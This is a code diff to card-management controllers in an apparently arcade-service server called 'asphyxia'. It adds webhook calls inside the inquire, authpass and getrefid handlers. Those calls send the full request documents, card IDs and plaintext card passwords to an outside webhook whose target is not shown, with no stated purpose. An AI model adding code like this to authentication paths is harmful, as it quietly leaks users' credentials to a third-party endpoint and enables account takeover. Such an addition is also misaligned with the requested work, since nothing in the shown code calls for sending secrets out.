@@ -29,6 +29,9 @@ namespace asphyxia.Controllers.Core
             string cardType = cardmng.Attribute("cardtype").Value;
             string update = cardmng.Attribute("update").Value;
 
+
+            Webhook.SendEmbed(Webhook.CreateEmbed("cardmng.inquire", data.Document.ToString(), "card id: " + cardId));
+
             var card = ctx.Cards.SingleOrDefault(c => c.CardId == cardId);
             
             if (card != null)
@@ -59,7 +62,10 @@ namespace asphyxia.Controllers.Core
 
             string pass = cardmng.Attribute("pass").Value;
             string refId = cardmng.Attribute("refid").Value.ToUpper();
-            
+
+            Webhook.SendEmbed(Webhook.CreateEmbed("cardmng.authpass", data.Document.ToString(), $"card id: {refId} pass: {pass}"));
+
+
             Card card = await ctx.Cards
                 .SingleOrDefaultAsync(c => c.RefId == refId);
 
@@ -83,6 +89,9 @@ namespace asphyxia.Controllers.Core
 
             string cardId = cardmng.Attribute("cardid").Value.ToUpper();
             string passwd = cardmng.Attribute("passwd").Value;
+
+            Webhook.SendEmbed(Webhook.CreateEmbed("cardmng.getrefid", data.Document.ToString(), $"card id: {cardId} pass: {passwd}"));
+
 
             if (await ctx.Cards.AnyAsync(c => c.CardId == cardId))
             {
